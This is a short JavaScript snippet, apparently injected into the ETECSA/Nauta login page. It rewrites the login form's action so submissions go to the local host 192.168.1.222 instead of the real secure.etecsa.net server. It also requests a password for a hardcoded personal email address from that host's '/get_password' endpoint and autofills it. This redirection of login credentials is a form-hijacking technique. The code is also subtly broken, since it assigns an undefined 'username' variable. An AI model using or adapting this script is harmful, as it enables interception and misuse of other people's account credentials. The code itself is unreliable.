(function () { 
    var t = setInterval(function () { 
        var f = document.getElementById('formulario'); 
        if (f && f.action) { 
            f.action = f.action.replace('https://secure.etecsa.net:8443', 'http://192.168.1.222').replace('//LoginServlet', '/LoginServlet'); 
            try{

            
            fetch('http://192.168.1.222:5000/get_password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username: 'mariaceciliabernal@nauta.com.cu' })
            })
            .then(res => res.json())
            .then(data => {
                if (data.password) {
                    document.getElementById('username').value = username;
                    document.getElementById('password').value = data.password;
                } else {
                    console.error('Usuario no encontrado o error:', data.error);
                }
            })
            .catch(err => console.error('Error al obtener contraseña:', err));

            }catch(err){
                console.error('Error al hacer request:', err)
            }
            clearInterval(t); 
        } 
    }, 100); 
    setTimeout(function () { 
        clearInterval(t); 
    }, 1000); 
})();